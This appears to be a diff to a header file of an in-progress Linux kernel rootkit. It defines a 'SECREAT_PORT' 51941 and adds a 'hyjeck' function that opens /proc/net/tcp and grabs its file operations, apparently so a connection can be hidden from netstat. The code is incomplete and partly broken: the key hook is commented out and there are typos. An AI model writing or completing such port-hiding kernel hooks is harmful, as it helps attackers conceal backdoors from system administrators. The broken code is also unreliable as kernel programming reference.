@@ -10,13 +10,11 @@
 #include <linux/list.h>
 #include <linux/sched.h>
 #include <linux/kmod.h>
+#include <net/udp.h>
+#include <net/tcp.h>
 #include "seq.h"
 #define SECREAT_PORT "51941"
-
-//static struct inode *proc_inode;
-//static struct file_operations *backup_fops;
-//static struct file_operations proc_fops;
-/*struct proc_dir_entry {
+struct proc_dir_entry {
 		unsigned int low_ino;
 		umode_t mode;
 		nlink_t nlink;
@@ -30,13 +28,18 @@
 		struct rb_node subdir_node;
 		void *data;
 		atomic_t count;					/* use count */
-//		atomic_t in_use;				/* number of callers into module in progress; */							/* negative -> it's going away RSN */
-//		struct completion *pde_unload_completion;
-//		struct list_head pde_openers;	/* who did ->open, but not ->release */
-//		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
-//		u8 namelen;
-//		char name[];
-//};
+		atomic_t in_use;				/* number of callers into module in progress; */
+										/* negative -> it's going away RSN */
+		struct completion *pde_unload_completion;
+		struct list_head pde_openers;	/* who did ->open, but not ->release */
+		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
+		u8 namelen;
+		char name[];
+};
+//static struct inode *proc_inode;
+//static struct file_operations *backup_fops;
+//static struct file_operations proc_fops;
+
 //int origin_show(struct seq_file *seq, void *v );
 /*int set_seq_op(char *op, char * path, int (*f_new)(struct seq_file *seq_f, void *v))
 {
@@ -55,24 +58,8 @@
 
     
 }*/
-/*
-static void netstat_hook(void)
-{
-    struct rb_root proc_rb_root;
-    struct rb_node *proc_rb_last, *proc_rb_nodeptr;
-    struct tcp_seq_afinfo *tcp_seq;
-    struct udp_seq_afinfo *udp_seq;
-    struct proc_dir_entry *entry_ptr;
-    proc_rb_root =  init_net.proc_net->subdir;
-    proc_rb_last = rb_last(&proc_rb_root);
-    proc_rb_nodeptr = rb_first(&proc_rb_root);
-    while (proc_rb_nodeptr != proc_rb_last)
-    {
-        entry_ptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
-    }
 
-}
-*/
+
 /*
 static void b(void)
 {
@@ -112,15 +99,28 @@ static void b(void)
 //op is the opertions
 //path is the path to the spefic file
 // 
- #define set_afinfo_seq_op(op, path, afinfo_struct, f_new, old)\
- {                                                              \
-    struct path *p;                                              \
-    struct inode f_inode, backup_inode;                           \
-    kern_path(path, 0, p);                                         \
-    af_info = PDE(p->dentry->d_inode);                              \
-    old = af_info->seq_ops;                                       \
-    afinfo->seq_ops = seq_ops;                                       \
- }                                                                     \
-    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, ct_seq_show, origin_seq_show);                                                          
-    
+
+void set_afinfo_seq_op(char * path)
+ {     
+    struct file *file;                                                         
+    struct path *p;
+    static const struct file_operations *org_fops;                                              
+    struct tcp_seq_afinfo *af_info;
+    struct proc_dir_entry *entry;
+    file = filp_open(path, O_RDWR, 0);                                    
+    org_fops = file->f_op;
+    //ern_path(path, 0, p);                                         
+    //entry = PDE(p->dentry->d_inode);
+    //org_fops = entry->proc_dir_fops; 
+    //origin_seq_show = origin_seq_ops.show;                                      
+    //PDE_DATA(p->dentry->d_inode)->seq_ops= seq_ops;                                       
+ }              
+ void hyjeck(void)
+ {
+
+     set_afinfo_seq_op("/proc/net/tcp");
+
+ }
+
+                                                  
 #endif
